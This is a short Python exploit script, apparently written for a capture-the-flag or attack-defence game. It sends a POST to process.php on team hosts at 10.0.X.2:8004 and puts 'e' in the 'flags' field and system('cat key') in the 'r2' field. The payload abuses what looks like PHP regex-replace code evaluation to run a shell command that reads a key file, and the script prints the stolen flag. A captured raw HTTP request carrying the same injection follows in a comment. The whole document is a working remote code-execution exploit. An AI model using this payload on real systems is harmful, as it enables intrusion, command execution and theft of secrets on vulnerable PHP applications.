import sys
import requests

url = 'http://10.0.{}.2:8004/process.php'.format(sys.argv[1])
payload = {'flags' : 'e', 'r1' : 'bill', 'r2' :'system(\'cat key\')', 'replace' : '1', 'color' : '0', 'LOGGING' : '0', 'search' : 'hell my name is bill'}

r = requests.post(url, data=payload)
flag = r.text.split(' ')[-1]

print flag

'''
POST /process.php HTTP/1.1

Host: 10.0.3.2:8004

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Referer: http://10.0.3.2:8004/

Content-Length: 105

Connection: keep-alive

Pragma: no-cache

Cache-Control: no-cache



flags=&r1=bill&r2=system('cat%20.%2Fkey')&replace=1&color=0&LOGGING=0&search=hell%20my%20name%20is%20bill'''
